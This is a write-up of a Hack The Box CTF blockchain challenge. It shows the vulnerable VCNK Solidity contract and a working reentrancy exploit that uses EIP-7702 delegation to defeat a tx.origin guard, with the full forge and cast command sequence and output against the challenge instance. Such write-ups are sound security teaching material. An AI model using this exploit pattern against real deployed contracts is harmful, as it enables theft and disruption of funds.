---
title: HTB Business CTF 2025 Blockchain Challenge
date: 2025-05-28 00:00:00 +0000
categories: [CTF, Blockchain]
tags: [htb, foundry, docker, smartcontracts, solidity]
---

![Hack the Box Business CTF 2025 Logo](/assets/img/posts/HTB-Business-CTF-2025-logo.jpg){: width="700" height="400" }

## Spectral [Easy]

### Description

`A new nuclear power plant called "VCNK" has been built in Volnaya, and now the dominance of the energy lobby is now stronger than ever. You have been assigned to Operation "Blockout" and your mission is to find a way to disrupt the power plant to slow them down. See you in the dark!`

### Initial Analysis

The `blockchain-spectral.zip` archive contains a `foundry.toml` file and a `src` directory with `Setup.sol` and `VCNK.sol` smart contracts.

The `foundry.toml` file specifies the EVM version as `prague`, indicating the challenge uses a testnet or local environment simulating features from Ethereum’s [Pectra](https://ethereum.org/en/roadmap/pectra/) hard fork. The Prague upgrade is part of the larger Pectra fork (a combination of the Prague and Electra upgrades), implemented on Ethereum mainnet on May 7, 2025. One relevant change introduced in Pectra is [EIP-7702](https://eips.ethereum.org/EIPS/eip-7702), which allows EOAs to temporarily act like smart contracts by attaching custom code (which will be useful later).

#### foundry.toml

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
evm_version = "prague"

# See more config options https://github.com/foundry-rs/foundry/blob/master/crates/config/README.md#all-options
```

#### Setup.sol

Examining `Setup.sol`, the condition for solving the challenge is having the deployed `VCNK` contract's `controlUnit` status be `3` (`CU_STATUS_EMERGENCY`). 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import { VCNK } from "./VCNK.sol";

contract Setup {
    VCNK public TARGET;

    event DeployedTarget(address at);

    constructor() {
        TARGET = new VCNK();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        uint8 CU_STATUS_EMERGENCY = 3;
        (uint8 status, , , ) = TARGET.controlUnit();
        return status == CU_STATUS_EMERGENCY;
    }
}
```

#### VCNK.sol

The `VCNK.sol` contract defines the "Volnaya Centralized Nuclear Kernel," which includes a `ControlUnit` and allows `Gateway`s to register to receive power (ETH) from the plant.

Two important modifiers protect most of `VCNK.sol`’s functions:

1. `failSafeMonitor()`
   - Sets the `ControlUnit`'s status to `CU_STATUS_EMERGENCY` if its `currentCapacity` drops to or below the `FAILSAFE_THRESHOLD` (10 ETH).
   - Lowering `currentCapacity` below this threshold is the goal of the exploit.

2. `circuitBreaker()`
   - Enforces `msg.sender == tx.origin`, preventing smart contracts from calling protected functions.
   - Intended to block reentrancy and contract-based attacks.

`VCNK.sol` exposes the following functions:

1. `deliverEnergy(uint256 amount)`
   - Must be implemented by a `vcnkCompatibleReceiver` contract.
   - Called by `requestPowerDelivery()` to deliver ETH to a registered gateway.

2. `registerGateway(address _gateway)`
   - Registers a contract as a gateway (up to 5 gateways total).
   - Requires a 20 ETH payment to register.

3. `requestQuotaIncrease()`
   - Increases a gateway’s energy quota (ETH) up to a maximum of 10 ETH.

4. `requestPowerDelivery(uint256 _amount, address _receiver)`
   - Sends ETH to a registered gateway by calling its `deliverEnergy()` function.
     - The gateway must be in `GATEWAY_STATUS_IDLE`.
     - Amount must be ≤ the gateway’s quota (≤ 10 ETH).
   - Subtracts `_amount` from the `controlUnit`'s `currentCapacity` *before* calling `deliverEnergy()`.
   - Resets `currentCapacity` to `MAX_CAPACITY` (100 ETH) after delivery completes.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

/*
  _   __     __                      _____         __           ___            __  _  __         __               __ __                 __
 | | / /__  / /__  ___ ___ _____ _  / ___/__ ___  / /________ _/ (_)__ ___ ___/ / / |/ /_ ______/ /__ ___ _____  / //_/__ _______  ___ / /
 | |/ / _ \/ / _ \/ _ `/ // / _ `/ / /__/ -_) _ \/ __/ __/ _ `/ / /_ // -_) _  / /    / // / __/ / -_) _ `/ __/ / ,< / -_) __/ _ \/ -_) / 
 |___/\___/_/_//_/\_,_/\_, /\_,_/  \___/\__/_//_/\__/_/  \_,_/_/_//__/\__/\_,_/ /_/|_/\_,_/\__/_/\__/\_,_/_/   /_/|_|\__/_/ /_//_/\__/_/  
                      /___/                                                                                                               
                                                      Volnaya Centralized Nuclear Kernel
*/

interface vcnkCompatibleReceiver {
  function deliverEnergy(uint256 amount) external returns (bool);
}

contract VCNK {
  ControlUnit public controlUnit;
  mapping(address => Gateway) public gateways;

  uint8 constant CU_STATUS_IDLE = 1;
  uint8 constant CU_STATUS_DELIVERING = 2;
  uint8 constant CU_STATUS_EMERGENCY = 3;
  uint8 constant GATEWAY_STATUS_UNKNOWN = 0;
  uint8 constant GATEWAY_STATUS_IDLE = 1;
  uint8 constant GATEWAY_STATUS_ACTIVE = 2;
  uint8 constant MAX_GATEWAYS = 5;
  uint256 constant MAX_CAPACITY = 100 ether;
  uint256 constant MAX_ALLOWANCE_PER_GATEWAY = 10 ether;
  uint256 constant GATEWAY_REGISTRATION_FEE = 20 ether;
  uint256 constant FAILSAFE_THRESHOLD = 10 ether;

  struct ControlUnit {
    uint8 status;
    uint256 registeredGateways;
    uint256 currentCapacity;
    uint256 allocatedAllowance;
  }
  
  struct Gateway {
    uint8 status;
    uint256 quota;
    uint256 totalUsage;
  }

  event GatewayRegistered(address indexed gateway);
  event GatewayQuotaIncrease(address indexed gateway, uint256 quotaAmount);
  event PowerDeliveryRequest(address indexed gateway, uint256 powerAmount);
  event PowerDeliverySuccess(address indexed gateway, uint256 powerAmount);
  event ControlUnitEmergencyModeActivated();

  modifier failSafeMonitor() {
    if (controlUnit.currentCapacity <= FAILSAFE_THRESHOLD) {
      controlUnit.status = CU_STATUS_EMERGENCY;
      emit ControlUnitEmergencyModeActivated();
    }
    else {
      _;
    }
  }

  modifier circuitBreaker() {
    require(msg.sender == tx.origin, "[VCNK] Illegal reentrant power delivery request detected.");
    _;
  }

  constructor() {
    controlUnit.status = CU_STATUS_IDLE;
    controlUnit.currentCapacity = MAX_CAPACITY;
    controlUnit.allocatedAllowance = 0;
  }

  function registerGateway(address _gateway) external payable circuitBreaker failSafeMonitor {
    require(
      controlUnit.registeredGateways < MAX_GATEWAYS,
      "[VCNK] Maximum number of registered gateways reached. Infrastructure will be scaled up soon, sorry for the inconvenience."
    );
    require(msg.value == GATEWAY_REGISTRATION_FEE, "[VCNK] Registration fee must be 20 ether.");
    Gateway storage gateway = gateways[_gateway];
    require(gateway.status == GATEWAY_STATUS_UNKNOWN, "[VCNK] Gateway is already registered.");
    gateway.status = GATEWAY_STATUS_IDLE;
    gateway.quota = 0;
    gateway.totalUsage = 0;
    controlUnit.registeredGateways += 1;
    emit GatewayRegistered(_gateway);
  }

  function requestQuotaIncrease(address _gateway) external payable circuitBreaker failSafeMonitor {
    require(msg.value > 0, "[VCNK] Deposit must be greater than 0.");
    Gateway storage gateway = gateways[_gateway];
    require(gateway.status != GATEWAY_STATUS_UNKNOWN, "[VCNK] Gateway is not registered.");
    uint256 currentQuota = gateway.quota;
    require(currentQuota + msg.value <= MAX_ALLOWANCE_PER_GATEWAY, "[VCNK] Requested quota exceeds maximum allowance per gateway.");
    gateway.quota += msg.value;
    controlUnit.allocatedAllowance += msg.value;
    emit GatewayQuotaIncrease(_gateway, msg.value);
  }

  function requestPowerDelivery(uint256 _amount, address _receiver) external circuitBreaker failSafeMonitor {
    Gateway storage gateway = gateways[_receiver];
    require(gateway.status == GATEWAY_STATUS_IDLE, "[VCNK] Gateway is not in a valid state for power delivery.");
    require(_amount > 0, "[VCNK] Requested power must be greater than 0.");
    require(_amount <= gateway.quota, "[VCNK] Insufficient quota.");
    
    emit PowerDeliveryRequest(_receiver, _amount);
    controlUnit.status = CU_STATUS_DELIVERING;
    controlUnit.currentCapacity -= _amount;

    vcnkCompatibleReceiver(_receiver).deliverEnergy(_amount);
    gateway.totalUsage += _amount;

    controlUnit.currentCapacity = MAX_CAPACITY;
    emit PowerDeliverySuccess(_receiver, _amount);
  }
}
```

### Solution 

Based this analysis information, the attack path is:

Deploy a contract with a malicious implementation of `deliverEnergy()` that conducts a reentrancy attack by recursively calling `requestPowerDelivery()` to drain `VCNK.sol` `controlUnit`'s `MAX_CAPACITY` to or below 10 ETH, triggering `failSafeMonitor()` and updating `VCNK.sol`'s `controlUnit` status to `CU_STATUS_EMERGENCY`.

But how can the exploit contract bypass `circuitBreaker()` to conduct the reentrancy attack? If a malicious contract is deployed and iniates function calls to `VCNK.sol` when prompted by the player's EOA, the `msg.sender` will be the contract but the `tx.origin` would be the player's EOA triggering `circuitBreaker()` and preventing a reentrancy attack.

Recall the challenge blockchain's `prague` version with [EIP-7702](https://eips.ethereum.org/EIPS/eip-7702). EIP-7702 "allows Externally Owned Accounts (EOAs) to set the code in their account." Basically, a wallet (EOA) can also act as smart contract by attaching code to itself. This change is relevant because the deployed exploit contract's code can be added to the player, and the player can call that code to trigger the reentrancy attack bypassing `circuitBreaker()` because both `msg.sender` and `tx.origin` will be the player's EOA address.

So the attack path is:

1. Write an exploit contract which implements `deliverEnergy()` and has a malicious function which triggers a reentrancy attack against the target `VCNK.sol` contract.
2. Deploy the exploit contract
3. Register the player's EOA as a gateway.
4. Request the player EOA gateway's quota to be set to 10 ETH.
5. Add the exploit contract's code to the player's EOA.
6. Initialize the player's EOA code.
7. Call the exploit contract's function to trigger the reentrancy attack.
8. Confirm `VCNK.sol`'s `controlUnit` status is `CU_STATUS_EMERGENCY`. 
9. Grab the flag.

#### 1. `Exploit.sol`

`Exploit.sol` will complete the attack with the following functions:

- `initialize()` is executed to populate the player's EOA storage with `Exploit.sol`'s variables after its code is added to the player's EOA.
- `exploit()` initiates the reentrancy attack by sending the initial `requestPowerDelivery()` function call to `VCNK.sol` requesting 10 ETH which then calls `Exploit.sol`'s `deliverEnergy()` implementation.
- `deliverEnergy()` implements the `vcnkCompatibleReceiver` interface and continues a loop started by `exploit()` by calling `VCNK.sol`'s `requestPowerDelivery()` function again requesting 10 ETH which calls `Exploit.sol`'s `deliverEnergy()` and so on until `VCNK.sol`'s `MAXIMUM_CAPACITY` falls below the `FAILSAFE_THRESHOLD` triggering `failSafeMonitor()` completing the reentrancy attack and setting `VCNK.sol`'s `controlUnit` status to `CU_STATUS_EMERGENCY`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {vcnkCompatibleReceiver, VCNK} from "./VCNK.sol";

contract Exploit is vcnkCompatibleReceiver {
    VCNK public target;
    uint public reentrantCount;
    address public owner;

    constructor(address _target) {
        owner = msg.sender;
        target = VCNK(_target);
    }

    function initialize(address _target) public {
        owner = msg.sender;
        target = VCNK(_target);
    }

    function exploit() external {
        target.requestPowerDelivery(10 ether, address(this));
    }

    function deliverEnergy(uint256 amount) external override returns (bool) {
        reentrantCount++;
        if (reentrantCount < 10) {
            target.requestPowerDelivery(10 ether, address(this));
        }
        return true;
    }

    receive() external payable {}
}
```

#### 2. Deploying `Exploit.sol`

First, the challenge's connection and player information is grabbed using Netcat and set to environment variables for easier use:
  - Typically, the first IP and port is the challenge's RCP endpoint, and the second IP and port is for getting connection information, resetting the challenge environment, and requesting the flag.

```bash
$ nc -nv 94.237.58.121 30902
(UNKNOWN) [94.237.58.121] 30902 (?) open
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 1
[*] No running node found. Launching new node...

Player Private Key : 0x33d3238a78cb189d1f65ab49f0829a9fcc54cd2917ae44ff1bae9fd5a3d97432
Player Address     : 0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322                                                                                  
Target contract    : 0xeb328838820E0D4abCBEfdf0eb403375ED0Fb1Cd
Setup contract     : 0xaf86D31181dFc339DE2C98a2270Cd46e84cf2849

$ export PK=0x33d3238a78cb189d1f65ab49f0829a9fcc54cd2917ae44ff1bae9fd5a3d97432
$ export PLAYER=0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322
$ export TARGET=0xeb328838820E0D4abCBEfdf0eb403375ED0Fb1Cd
$ export RPC=http://94.237.58.121:34807
```

Using Paradigm's [Foundry](https://github.com/foundry-rs) tool suite's `forge` tool, `Exploit.sol` is compiled and deployed to the challenge's blockchain:

```bash
# In the unzipped challenge directory, place Exploit.sol in ./src directory.
# Initialize Foundry project with forge command
$ forge init --force
Warning: Target directory is not empty, but `--force` was specified
Initializing blockchain-spectral...
Installing forge-std in blockchain-spectral/lib/forge-std (url: Some("https://github.com/foundry-rs/forge-std"), tag: None)
Cloning into 'blockchain-spectral/lib/forge-std'...
remote: Enumerating objects: 2117, done.
remote: Counting objects: 100% (1048/1048), done.
remote: Compressing objects: 100% (152/152), done.
remote: Total 2117 (delta 960), reused 908 (delta 896), pack-reused 1069 (from 1)
Receiving objects: 100% (2117/2117), 682.08 KiB | 12.40 MiB/s, done.
Resolving deltas: 100% (1436/1436), done.
    Installed forge-std v1.9.7
    Initialized forge project

# Deploy `Exploit.sol`
$ forge create --rpc-url $RPC --private-key $PK --broadcast src/Exploit.sol:Exploit --constructor-args $TARGET
[⠃] Compiling...
[⠒] Compiling 2 files with Solc 0.8.29
[⠢] Solc 0.8.29 finished in 16.80ms
Compiler run successful with warnings:
Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> src/Exploit.sol:24:28:
   |
24 |     function deliverEnergy(uint256 amount) external override returns (bool) {
   |                            ^^^^^^^^^^^^^^

Deployer: 0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322
Deployed to: 0xEd7f8aA5Bb4E3589Ef0Dbe787a3Bf1c4FFDf28ed
Transaction hash: 0x692bd915afd28e3297b9a3a729b0850f82b0e875587ad478ed630960f3b5e411

# Export `Exploit.sol`'s address as environment variable
$ export EXPLOIT=0xEd7f8aA5Bb4E3589Ef0Dbe787a3Bf1c4FFDf28ed
```

#### 3. Register player EOA as a gateway

Using Foundry's `cast` tool, contracts on the challenge blockchain can be interacted with, including function calls:

```bash
$ cast send $TARGET "registerGateway(address)" $PLAYER --value 20ether --rpc-url $RPC --private-key $PK

blockHash            0x1be40cc1f3481f9a7d7ed2c9332eb306c5f11a1a2e3c5f3011f97ce4c5e19912
blockNumber          3
contractAddress      
cumulativeGasUsed    74601
effectiveGasPrice    1000000000
from                 0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322
gasUsed              74601
logs                 [{"address":"0xeb328838820e0d4abcbefdf0eb403375ed0fb1cd","topics":["0x18eacfcb80f18277666c9aaa9f292d376a4fdb0058757cc563a0f20ab0be120b","0x000000000000000000000000c73d564184ca0b12a6a5fc76abca356bdf6b0322"],"data":"0x","blockHash":"0x1be40cc1f3481f9a7d7ed2c9332eb306c5f11a1a2e3c5f3011f97ce4c5e19912","blockNumber":"0x3","blockTimestamp":"0x6837adec","transactionHash":"0x2126a7a21d4149a3904a220e4d09eb24db1662e2ddcd7cacf4c712c5c8c7722c","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom            0x00000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000080000000000000000000000000000000002000000000000000000002000000000000000000000000000000000000000000000000010000000000000000000000000000000000000100000000000000000000
root                 
status               1 (success)
transactionHash      0x2126a7a21d4149a3904a220e4d09eb24db1662e2ddcd7cacf4c712c5c8c7722c
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0xeb328838820E0D4abCBEfdf0eb403375ED0Fb1Cd
```

#### 4. Request 10 ETH quota for player EOA gateway

```bash
$ cast send $TARGET "requestQuotaIncrease(address)" $PLAYER --value 10ether --rpc-url $RPC --private-key $PK

blockHash            0x9e541abb04c07351aa484165c4e85686b0d926779cc7ee41907af7f2ce4c8d4a
blockNumber          4
contractAddress      
cumulativeGasUsed    72844
effectiveGasPrice    1000000000
from                 0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322
gasUsed              72844
logs                 [{"address":"0xeb328838820e0d4abcbefdf0eb403375ed0fb1cd","topics":["0xb0e98ca922f9ad3cbd25ab949b19ea0c6897b757a42a7540fd4bfd39bfba19c4","0x000000000000000000000000c73d564184ca0b12a6a5fc76abca356bdf6b0322"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x9e541abb04c07351aa484165c4e85686b0d926779cc7ee41907af7f2ce4c8d4a","blockNumber":"0x4","blockTimestamp":"0x6837ae2c","transactionHash":"0x8e700454fa69ce854a1bc4fe0a493103c150923781a6f1cdc5d77df5aa64f6bd","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000100000000000000002000000000000000000002000000000000000000000000000000000000000000000000014000000000000000000000000000000000000100000000000000000000
root                 
status               1 (success)
transactionHash      0x8e700454fa69ce854a1bc4fe0a493103c150923781a6f1cdc5d77df5aa64f6bd
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0xeb328838820E0D4abCBEfdf0eb403375ED0Fb1Cd

# Can confirm player EOA's gateway status and quota
$ cast call $TARGET "gateways(address)(uint8,uint256,uint256)" $PLAYER --rpc-url $RPC
1
10000000000000000000 [1e19]
0
```

#### 5. Add the exploit contract's code to the player's EOA

Using Berachain Core Docs's [EIP-7702 Basics For Setting Code For An EOA](https://docs.berachain.com/developers/guides/eip7702-basics#eip-7702-basics-for-setting-code-for-an-eoa) as a guide, an arbitrary (but validly formatted) EOA and private key are used to set the player's EOA with the `Exploit.sol` code:

```bash
# Set up env variables for separate signing account for EIP-7702 transaction
# https://docs.berachain.com/developers/guides/eip7702-basics#step-5-set-helloworld-code-for-eoa
$ export OTHER_PLAYER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
$ export OTHER_PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

# Send other account 1 ETH for auth transaction
$ cast send $OTHER_PLAYER --value 1ether --private-key $PK --rpc-url $RPC

blockHash            0xab5802be75de558dff51d14bf34f010aebce066c630756454278eb775613cf96
blockNumber          5
contractAddress      
cumulativeGasUsed    21000
effectiveGasPrice    1000000000
from                 0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322
gasUsed              21000
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x8f91607c924c80e03c87a5f6c43409a0dc3d40a6dd8868d29210041b693e862b
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0x70997970C51812dc3A010C7d01b50e0d17dc79C8

# Created authorization for player EoA and Exploit.sol contract
$ SIGNED_AUTH=$(cast wallet sign-auth $EXPLOIT --private-key $PK --rpc-url $RPC)

# Set the Exploit.sol code for the player EOA
$ cast send $(cast az) --private-key $OTHER_PK --auth $SIGNED_AUTH --rpc-url $RPC

blockHash            0xb3b067ea31d6153ccf325c52766d0a8b81f47772a8f8baefcd73e34e2eb8443b
blockNumber          6
contractAddress      
cumulativeGasUsed    36800
effectiveGasPrice    1000000000
from                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
gasUsed              36800
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0xbac47659e6e8257ada4c5de2e309da7112b13b4c9d2804fde62381ca1cc145f8
transactionIndex     0
type                 4
blobGasPrice         1
blobGasUsed          
to                   0x0000000000000000000000000000000000000000

# Confirm EOA authorization list (using code setting transaction hash)
# Note PLAYER (0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322) and EXPLOIT (0xEd7f8aA5Bb4E3589Ef0Dbe787a3Bf1c4FFDf28ed)
$ cast tx 0xbac47659e6e8257ada4c5de2e309da7112b13b4c9d2804fde62381ca1cc145f8 --rpc-url $RPC

<snip>
authorizationList    [
        {recoveredAuthority: 0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322, signedAuthority: {"chainId":"0x7a69","address":"0xed7f8aa5bb4e3589ef0dbe787a3bf1c4ffdf28ed","nonce":"0x4","yParity":"0x1","r":"0xb3707780f51a48e21d2397c148d97b16c3dd01c84bd37a996eb555daaf88ef39","s":"0x24769a07445ecf01eec1431ec0c9b7eef6362a8be6feb903903787b050eab4ea"}}
]
<snip>

# Confirm Exploit.sol code at player EOA
# https://docs.berachain.com/developers/guides/eip7702-basics#step-7-verify-eoa-code-set
$ cast code $PLAYER --rpc-url $RPC
0xef0100ed7f8aa5bb4e3589ef0dbe787a3bf1c4ffdf28ed
```

#### 6. Initilize the player's EOA code

Because storage initialization typically happens when a contract is deployed and the `Exploit.sol` code is simply being set for the player's EOA, the `initilizaiton()` function is called to allocate the `owner` and `target` variables from the `Exploit.sol` constructor:

```bash
# https://docs.berachain.com/developers/guides/eip7702-basics#step-7-verify-eoa-code-set
$ cast send $PLAYER "initialize(address)" --private-key $OTHER_PK --rpc-url $RPC $TARGET

blockHash            0xe2c74eb1165f1c6569153e11a8429bddcb3fa27529940558075d341d82e6cee2
blockNumber          7
contractAddress      
cumulativeGasUsed    66277
effectiveGasPrice    1000000000
from                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
gasUsed              66277
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0xc0044afabee4e6f92da9f77fc4f3acefeeed09f19c8bba2005820ac355b1d600
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322
```

#### 7. Call the EOA's exploit function to trigger the reentrancy attack

```bash
# Confirm VCNK.sol's ControlUnit status (CU_STATUS_IDLE = 1)
$ cast call $TARGET "controlUnit() returns (uint8,uint256,uint256,uint256)" --rpc-url $RPC | head -n1 | cast --to-dec 
1

# Call EOA's exploit function
$ cast send $PLAYER "exploit()" --rpc-url $RPC --private-key $PK

blockHash            0xdf81d84687bfaeb3414e9b50c71527297461f665953f64f6f79881beb5680320
blockNumber          8
contractAddress      
cumulativeGasUsed    157636
effectiveGasPrice    1000000000
from                 0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322
gasUsed              157636
logs                 [{"address":"0xeb328838820e0d4abcbefdf0eb403375ed0fb1cd","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000c73d564184ca0b12a6a5fc76abca356bdf6b0322"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0xdf81d84687bfaeb3414e9b50c71527297461f665953f64f6f79881beb5680320","blockNumber":"0x8","blockTimestamp":"0x6837b49d","transactionHash":"0x69d06e9276128d08469b6f476d3518a2fa3d9b3a91b3fd2489b716a22253e713","transactionIndex":"0x0","logIndex":"0x0","removed":false},{"address":"0xeb328838820e0d4abcbefdf0eb403375ed0fb1cd","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000c73d564184ca0b12a6a5fc76abca356bdf6b0322"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0xdf81d84687bfaeb3414e9b50c71527297461f665953f64f6f79881beb5680320","blockNumber":"0x8","blockTimestamp":"0x6837b49d","transactionHash":"0x69d06e9276128d08469b6f476d3518a2fa3d9b3a91b3fd2489b716a22253e713","transactionIndex":"0x0","logIndex":"0x1","removed":false},{"address":"0xeb328838820e0d4abcbefdf0eb403375ed0fb1cd","topics":["0x3283b72465e6fb1c5a42840f14b0a024a2ecf0ac5478cfff3338b7fe4d1373de","0x000000000000000000000000c73d564184ca0b12a6a5fc76abca356bdf6b0322"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0xdf81d84687bfaeb3414e9b50c71527297461f665953f64f6f79881beb5680320","blockNumber":"0x8",

<snip>

"blockTimestamp":"0x6837b49d","transactionHash":"0x69d06e9276128d08469b6f476d3518a2fa3d9b3a91b3fd2489b716a22253e713","transactionIndex":"0x0","logIndex":"0x10","removed":false},{"address":"0xeb328838820e0d4abcbefdf0eb403375ed0fb1cd","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000c73d564184ca0b12a6a5fc76abca356bdf6b0322"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0xdf81d84687bfaeb3414e9b50c71527297461f665953f64f6f79881beb5680320","blockNumber":"0x8","blockTimestamp":"0x6837b49d","transactionHash":"0x69d06e9276128d08469b6f476d3518a2fa3d9b3a91b3fd2489b716a22253e713","transactionIndex":"0x0","logIndex":"0x11","removed":false},{"address":"0xeb328838820e0d4abcbefdf0eb403375ed0fb1cd","topics":["0xc303f77669a8be84fee7899b99ddeab599993e5ead94a9589b41831140a12902","0x000000000000000000000000c73d564184ca0b12a6a5fc76abca356bdf6b0322"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0xdf81d84687bfaeb3414e9b50c71527297461f665953f64f6f79881beb5680320","blockNumber":"0x8","blockTimestamp":"0x6837b49d","transactionHash":"0x69d06e9276128d08469b6f476d3518a2fa3d9b3a91b3fd2489b716a22253e713","transactionIndex":"0x0","logIndex":"0x12","removed":false}]
logsBloom            0x00000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000080000000000000000000000000000000002000000020000000000002000000000020020200000000000000000000000004000000010000000000000000000000000000000000000100000000000000000000
root                 
status               1 (success)
transactionHash      0x69d06e9276128d08469b6f476d3518a2fa3d9b3a91b3fd2489b716a22253e713
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0xC73d564184Ca0B12A6a5fC76aBcA356bdf6b0322
```

#### 8. Confrim `VCNK.sol`'s `controlUnit` status is `CU_STATUS_EMERGENCY` (3)

```bash
$ cast call $TARGET "controlUnit() returns (uint8,uint256,uint256,uint256)" --rpc-url $RPC | head -n1 | cast --to-dec
3
```

#### 9. Grab the flag 🍻

```bash
$ nc -nv 94.237.58.121 30902 
(UNKNOWN) [94.237.58.121] 30902 (?) open
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 3
HTB{Pectra_UpGr4d3_c4uSed_4_sp3cTraL_bL@cK0Ut_1n_V0LnaYa}
```